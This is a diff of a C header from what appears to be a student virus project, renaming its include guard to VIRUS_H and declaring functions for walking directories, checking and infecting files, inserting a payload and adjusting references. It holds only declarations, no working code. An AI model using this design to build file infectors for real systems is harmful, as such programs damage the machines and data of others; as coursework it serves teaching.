@@ -6,18 +6,17 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/22 23:20:06 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/26 21:57:06 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#ifndef INFECT_H
-# define INFECT_H // TODO
+#ifndef VIRUS_H
+# define VIRUS_H
 
 # include <fcntl.h>
 # include <stdint.h>
 # include <unistd.h>
 # include <sys/types.h>
-# include "famine.h"
 # include "accessors.h"
 
 /*
@@ -47,14 +46,14 @@ struct				entry
 
 void		virus(uint64_t seed[2]);
 void		infect_files_in(const char *path, uint64_t seed[2]);
-bool		infect_if_candidate(const char *file, uint64_t seed[2]);
+bool		infect(const char *file, uint64_t seed[2]);
 bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, uint64_t seed[2]);
 
 /*
 ** infection engine routines
 */
 
-bool		find_entry(struct entry *original_entry, struct safe_ptr ref);
+bool		find_entry(struct entry *file_entry, struct safe_ptr ref);
 bool		can_infect(const struct entry *original_entry, struct safe_ptr ref);
 bool		setup_payload(const struct entry *original_entry, struct safe_ptr ref, uint64_t son_seed[2]);
 bool		adjust_references(struct safe_ptr ref, size_t shift_amount, const struct entry *original_entry);
